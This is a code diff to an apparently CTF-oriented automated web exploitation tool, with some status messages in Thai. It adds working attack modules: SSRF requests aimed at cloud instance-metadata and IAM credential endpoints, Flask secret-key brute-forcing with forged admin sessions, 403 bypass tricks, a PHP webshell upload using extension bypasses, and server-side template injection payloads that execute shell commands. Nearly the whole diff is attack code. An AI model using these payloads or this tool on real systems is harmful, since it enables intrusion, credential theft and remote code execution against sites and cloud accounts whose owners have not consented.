@@ -22,6 +22,8 @@ from concurrent.futures import ThreadPoolExecutor
 from core import httpx
 from core.flag import extract_flags
 from modules.crypto.rsa import bytes_to_long, long_to_bytes, parse_pem
+from . import pad_oracle
+from . import sqli_union
 
 
 def _b64url(value):
@@ -199,14 +201,31 @@ def scan_graphql_batches(base, endpoints):
 def scan_internal_routes(base):
     findings, flags = [], []
 
-    # SSRF: cover decimal loopback and common internal flag/metadata routes.
-    for path in ("/fetch", "/api/fetch", "/api/relay", "/proxy", "/preview"):
-        for target in ("http://127.0.0.1:3000/flag",
-                       "http://127.0.0.1:3000/token",
-                       "http://2130706433:8080/internal/metadata",
-                       "http://127.0.0.1:8080/internal/flag"):
+    # SSRF: cover decimal loopback, common internal routes AND cloud
+    # instance-metadata services (AWS/GCP/Azure themed challenges)
+    internal_targets = (
+        "http://127.0.0.1:3000/flag",
+        "http://127.0.0.1:3000/token",
+        "http://2130706433:8080/internal/metadata",
+        "http://127.0.0.1:8080/internal/flag",
+        "http://169.254.169.254/latest/meta-data/",
+        "http://169.254.169.254/latest/user-data",
+        "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
+        "http://metadata.google.internal/computeMetadata/v1/",
+        "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
+    )
+    ssrf_headers = {
+        "metadata.google.internal": {"Metadata-Flavor": "Google"},
+    }
+    for path in ("/fetch", "/api/fetch", "/api/relay", "/proxy", "/preview",
+                 "/render", "/api/v1/fetch"):
+        for target in internal_targets:
+            extra = {}
+            for host_part, hdrs in ssrf_headers.items():
+                if host_part in target:
+                    extra = hdrs
             url = base + path + "?url=" + urllib.parse.quote(target, safe="")
-            r = httpx.get(url, timeout=8)
+            r = httpx.get(url, headers=extra, timeout=8)
             got = _flags(r)
             if got:
                 findings.append(f"  [!] SSRF {path} reached internal target {target}")
@@ -411,7 +430,13 @@ def scan_advanced(base, endpoints):
             lambda b, e: scan_xpath_and_sqli(b),
             lambda b, e: scan_xxe(b, e),
             lambda b, e: scan_prototype_pollution(b, e),
-            lambda b, e: scan_cors(b))
+            lambda b, e: scan_cors(b),
+            lambda b, e: scan_flask_sessions(b),
+            lambda b, e: scan_403_bypass(b),
+            lambda b, e: scan_upload_bypass(b),
+            scan_ssti_rce,
+            lambda b, e: pad_oracle.scan_cbc_attacks(b, e),
+            lambda b, e: sqli_union.scan_union_sqli(b, e))
     findings, flags = [], []
     with ThreadPoolExecutor(max_workers=len(jobs)) as pool:
         futures = [pool.submit(job, base, endpoints) for job in jobs]
@@ -422,4 +447,319 @@ def scan_advanced(base, endpoints):
                 continue
             findings.extend(f)
             flags.extend(fl)
+    return findings, list(dict.fromkeys(flags))
+
+
+# ---------------------------------------------------------------------------
+# Flask session takeover (decode -> brute SECRET_KEY -> forge admin)
+# ---------------------------------------------------------------------------
+def _flask_wordlist(limit=150_000):
+    import os
+    words = ["password", "secret", "secret_key", "changeme", "supersecret",
+             "flask", "session", "keyboard", "letmein", "welcome",
+             "development", "dev", "test", "admin", "ctf", "flag"]
+    for env in ("ROCKYOU", "WORDLIST"):
+        path = os.environ.get(env)
+        if path and os.path.isfile(path):
+            try:
+                with open(path, encoding="utf-8", errors="ignore") as fh:
+                    for i, line in enumerate(fh):
+                        if i >= limit:
+                            break
+                        words.append(line.rstrip("\r\n"))
+            except Exception:
+                pass
+            break
+    return words
+
+
+def scan_flask_sessions(base):
+    """Find a signed 'session' cookie, crack its key, forge admin access."""
+    from . import flask_session as fs_mod
+
+    findings, flags = [], []
+    r = httpx.get(base + "/", timeout=8)
+    if r is None:
+        return [], []
+    values = []
+    if hasattr(r.headers, "get_all"):
+        values = r.headers.get_all("set-cookie") or []
+    sc = r.headers.get("set-cookie")
+    if not values and sc:
+        values = [sc]
+    for raw in values:
+        name, _, value = raw.partition("=")
+        if name.strip().lower() != "session":
+            continue
+        value = value.split(";")[0].strip()
+        parsed = fs_mod.parse(value)
+        if not parsed or not isinstance(parsed.get("payload"), dict):
+            continue
+        findings.append(f"  [*] Flask session decoded: {parsed['payload']}")
+        secret = fs_mod.brute(value, _flask_wordlist(), workers=16)
+        if not secret:
+            findings.append("  [!] brute secret_key ไม่ผ่าน (wordlist เดาไม่ออก)")
+            continue
+        findings.append(f"  [!] Flask SECRET_KEY = {secret!r} — forging admin cookies")
+        for forged in fs_mod.forge_variants(parsed["payload"], secret):
+            got = []
+            for path in ("/admin", "/flag", "/dashboard", "/api/me",
+                         "/profile"):
+                rr = httpx.get(base + path,
+                               headers={"Cookie": f"session={forged}"},
+                               timeout=8)
+                if rr is None:
+                    continue
+                known, cands = extract_flags(rr.text)
+                got.extend(known + cands)
+            if got:
+                findings.append("  [!] forged session granted protected access!")
+                flags.extend(got)
+                return findings, list(dict.fromkeys(flags))
+        break
+    return findings, flags
+
+
+# ---------------------------------------------------------------------------
+# 403 / authz bypass on locked paths
+# ---------------------------------------------------------------------------
+_BYPASS_HEADERS = [
+    {"X-Forwarded-For": "127.0.0.1"},
+    {"X-Originating-IP": "127.0.0.1"},
+    {"X-Remote-Addr": "127.0.0.1"},
+    {"X-Client-IP": "127.0.0.1"},
+    {"X-Forwarded-Host": "localhost"},
+    {"X-Custom-IP-Authorization": "127.0.0.1"},
+    {"Referer": "https://google.com"},
+]
+
+
+def scan_403_bypass(base):
+    """Try classic 401/403 bypass tricks on every locked path found."""
+    findings, flags = [], []
+    candidates = ("/admin", "/flag", "/internal", "/debug", "/console",
+                  "/administrator", "/api/admin")
+    locked_paths = []
+    for path in candidates:
+        r = httpx.get(base + path, timeout=6)
+        if r is not None and r.status in (401, 403):
+            locked_paths.append((path, r.text))
+        if len(locked_paths) >= 3:
+            break
+    if not locked_paths:
+        return [], []
+
+    variants_tpl = [
+        "{p}", "{p}/", "{p}.", "{p}..;/", "/./{s}", "//{s}",
+        "/{s}/..;/", "/%2e/{s}",
+    ]
+    for path0, forbidden_body in locked_paths:
+        stripped = path0.strip("/")
+        variants = [v.format(p=path0, s=stripped) for v in variants_tpl]
+        hit = False
+        for variant in variants:
+            for extra in ([{}] + _BYPASS_HEADERS):
+                url = base + urllib.parse.quote(variant, safe="/%;.,")
+                r = httpx.get(url, headers=dict(extra), timeout=6,
+                              allow_redirects=False)
+                if r is None or r.status in (401, 403, 404):
+                    continue
+                got = _flags(r)
+                low = r.text.lower()
+                # accept only when it clearly unlocked something: flags,
+                # an admin-ish page, or a body that is neither the forbidden
+                # page nor a generic tiny error page
+                looks_admin = ("admin" in low or "flag" in low
+                               or "secret" in low or "welcome" in low)
+                meaningful = len(r.text) > max(60, len(forbidden_body) + 20)
+                if got or (r.status == 200 and (looks_admin or meaningful)):
+                    hdr_desc = ",".join(f"{k}:{v}" for k, v in extra.items())
+                    findings.append(
+                        f"  [!] 403 bypass → {variant}"
+                        + (f" [{hdr_desc}]" if hdr_desc else "")
+                        + f" ({r.status})")
+                    flags.extend(got)
+                    hit = True
+                    break
+            if hit:
+                break
+        if hit:
+            break
+    if not hit:
+        findings.append("  [i] 403 paths ยังล็อกอยู่ — ลอง fuzz header เพิ่มเอง")
+    return findings, list(dict.fromkeys(flags))
+
+
+# ---------------------------------------------------------------------------
+# File-upload bypass → webshell → flag
+# ---------------------------------------------------------------------------
+_UPLOAD_NAMES = [
+    "shell.php.png", "shell.php%00.png", "avatar.php", "shell.phtml",
+    "shell.phar", "shell.jpg.php", "shell.php5", ".htaccess-shell.php",
+    "shell.PNG", "shell.Php",
+]
+_SHELL_BODY = b"GIF89a\n<?php system($_GET['c'] ?? 'cat /flag* /home/*/flag* ../flag* 2>/dev/null'); ?>"
+_UPLOAD_PATHS = ("/upload", "/api/upload", "/upload.php", "/api/v1/upload",
+                 "/file/upload")
+_SHELL_DIRS = ("/uploads/", "/upload/", "/static/uploads/", "/files/",
+               "/img/", "/", "/media/")
+
+
+def _multipart(fields, file_field, filename, content, ctype):
+    boundary = "----ctfautoboundary9271"
+    parts = []
+    for k, v in fields.items():
+        parts.append(
+            f"--{boundary}\r\nContent-Disposition: form-data; "
+            f"name=\"{k}\"\r\n\r\n{v}\r\n".encode())
+    parts.append(
+        f"--{boundary}\r\nContent-Disposition: form-data; "
+        f"name=\"{file_field}\"; filename=\"{filename}\"\r\n"
+        f"Content-Type: {ctype}\r\n\r\n".encode() + content + b"\r\n")
+    parts.append(f"--{boundary}--\r\n".encode())
+    body = b"".join(parts)
+    return body, f"multipart/form-data; boundary={boundary}"
+
+
+def scan_upload_bypass(base):
+    findings, flags = [], []
+    upload_url = None
+    for p in _UPLOAD_PATHS:
+        probe = httpx.post(base + p, data=b"", timeout=6)
+        if probe is not None and probe.status not in (404, 405):
+            upload_url = base + p
+            break
+    if not upload_url:
+        return [], []
+    shell_url = None
+    for name in _UPLOAD_NAMES[:6]:
+        body, ctype = _multipart({"submit": "1"}, "file", name, _SHELL_BODY,
+                                 "image/png")
+        r = httpx.post(upload_url, data=body,
+                       headers={"Content-Type": ctype}, timeout=10)
+        if r is None or r.status >= 400:
+            continue
+        # response may reveal the stored path
+        import re as _re
+        m = _re.search(r"(?:href|src|path|url|file)[\"'\s:=]+([^\"'>\s]+)",
+                       r.text or "")
+        candidates = []
+        if m and m.group(1).startswith("/"):
+            candidates.append(m.group(1))
+        candidates += [d + name.lstrip(".") for d in _SHELL_DIRS]
+        candidates += [d + name.split("%00")[0] for d in _SHELL_DIRS]
+        for cand in candidates[:8]:
+            rr = httpx.get(base + cand.lstrip("/") if not cand.startswith("/")
+                           else base + cand, timeout=6)
+            if rr is None or rr.status >= 400:
+                continue
+            if b"GIF89a" in (rr.body or b"") and "<?php" in (rr.body or b""):
+                # stored but not executed — try executing via ?c=
+                exec_url = (base + cand) + "?c=id;cat+/flag*;ls+-la"
+                rr2 = httpx.get(exec_url, timeout=6)
+            elif "<?php" not in (rr.body or b""):
+                exec_url = (base + cand) + "?c=id;cat+/flag*;ls+-la"
+                rr2 = httpx.get(exec_url, timeout=6)
+            else:
+                exec_url = base + cand
+                rr2 = rr
+            if rr2 is None:
+                continue
+            known, cands = extract_flags(rr2.text)
+            output_hit = "uid=" in rr2.text or known or cands
+            if output_hit:
+                findings.append(
+                    f"[!] webshell executed at {cand} → "
+                    f"{known or cands or rr2.text[:80]}")
+                flags.extend(known + cands)
+                shell_url = cand
+                break
+        if shell_url:
+            break
+    if not shell_url:
+        findings.append("  [i] upload endpoint มีแต่ bypass ไม่สำเร็จ")
+    return findings, list(dict.fromkeys(flags))
+
+
+# ---------------------------------------------------------------------------
+# SSTI detection → engine-specific RCE ladder → flag readout
+# ---------------------------------------------------------------------------
+_SSTI_PROBES = [
+    ("{{7*7}}", "49"),
+    ("${7*7}", "49"),
+    ("<%= 7*7 %>", "49"),
+    ("{{7*'7'}}", "7777777"),
+]
+_RCE_LADDERS = (
+    ("jinja2", [
+        "{{ config.__class__.__init__.__globals__['os'].popen('cat /flag* /flag/* ../flag* flag* 2>/dev/null || id').read() }}",
+        "{% for x in ().__class__.__base__.__subclasses__() %}{% if \"warning\" in x.__name__ %}{{ x()._module.__builtins__['__import__']('os').popen('cat /flag* 2>/dev/null || id').read() }}{% endif %}{% endfor %}",
+        "{{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('id;cat /flag*').read() }}",
+        "{{ ''.__class__.__mro__[1].__subclasses__() }}",
+    ]),
+    ("twig", [
+        "{{ ['cat /flag* 2>/dev/null || id']|filter('system') }}",
+        "{{_self.env.registerUndefinedFilterCallback(\"exec\")}}{{_self.env.getFilter(\"cat /flag*; id\")}}",
+    ]),
+    ("mako", [
+        "${__import__('os').popen('cat /flag* 2>/dev/null || id').read()}",
+    ]),
+    ("erb", [
+        "<%= `cat /flag* 2>/dev/null || id` %>",
+    ]),
+)
+
+
+def scan_ssti_rce(base, endpoints, page_html=None):
+    """When {{7*7}} evaluates, escalate through per-engine RCE payloads."""
+    findings, flags = [], []
+    param_names = ("template", "name", "msg", "message", "content", "q",
+                   "page", "view", "preview", "text", "search")
+    targets = []
+    for ep in (endpoints or [])[:20]:
+        clean = ep.split("?")[0]
+        if any(word in clean.lower() for word in
+               ("render", "preview", "template", "page", "view", "message",
+                "note", "chat")) or clean.count("/") <= 1:
+            targets.append(clean)
+    if page_html:
+        import re as _re
+        for m in _re.finditer(
+                r'<(?:form|input)[^>]*name=["\'](\w+)["\']', page_html):
+            pass  # params already covered by generic names
+    targets = targets[:6] or [base]
+
+    def inject(url, payload):
+        sep = "&" if "?" in url else "?"
+        return httpx.get(
+            f"{url}{sep}" + "&".join(
+                f"{p}={urllib.parse.quote(payload)}" for p in param_names[:3]),
+            timeout=8)
+
+    confirmed = None
+    for url in targets:
+        for payload, marker in _SSTI_PROBES:
+            r = inject(url, payload)
+            if r is not None and marker in r.text:
+                confirmed = (url, payload)
+                findings.append(f"  [!] SSTI confirmed at {url}: "
+                                f"{payload} → {marker}")
+                break
+        if confirmed:
+            break
+    if not confirmed:
+        return ["  [i] ไม่พบ SSTI บน endpoints"], []
+    url = confirmed[0]
+    for engine, ladders in _RCE_LADDERS:
+        for payload in ladders:
+            r = inject(url, payload)
+            if r is None:
+                continue
+            known, cands = extract_flags(r.text)
+            if known or cands or "uid=" in r.text:
+                findings.append(
+                    f"  [!] SSTI RCE ({engine}) → {known or cands or 'uid leak'}")
+                flags.extend(known + cands)
+                return findings, list(dict.fromkeys(flags))
+    findings.append("  [i] SSTI ยืนยันแต่ RCE ladder ยังไม่ผ่าน filter")
     return findings, list(dict.fromkeys(flags))
